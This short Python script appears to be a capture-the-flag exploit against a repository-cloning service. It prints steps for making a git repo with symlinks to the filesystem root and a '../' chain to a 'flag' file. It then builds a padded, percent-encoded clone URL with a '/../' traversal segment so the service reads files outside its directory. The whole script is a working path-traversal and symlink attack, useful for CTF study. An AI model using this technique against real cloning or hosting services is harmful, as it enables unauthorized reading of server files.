import urllib.parse


def encode_repo_url(repo_url):
    return urllib.parse.quote(repo_url, safe='').replace('.', '%2e')


print('1. Create the repo:')
print('mkdir -p ')
print('ln -s / ')
print('ln -s ../../../../../../../../../../../../../../../../flag flag')

print('2. Commit and push the repo to GitHub or similar')

print('3. Use the following for the challenge:')

# Fill in your repo details.
prefix = 'https://github.com'
user = 'm417z'
repo = 'legit'

url1 = f'{prefix}/{user}/'
url2 = f'/../{repo}'
url1_enc = encode_repo_url(url1)
url2_enc = encode_repo_url(url2)

# Make sure the repo folder name is 255 characters long for everything to align
# nicely.
assert(len(url1_enc + url2_enc) < 255)
url = url1 + '_'*(255 - len(url1_enc + url2_enc)) + url2

print(f'Clone the repo: {url}')
print(f'Read the file: flag')
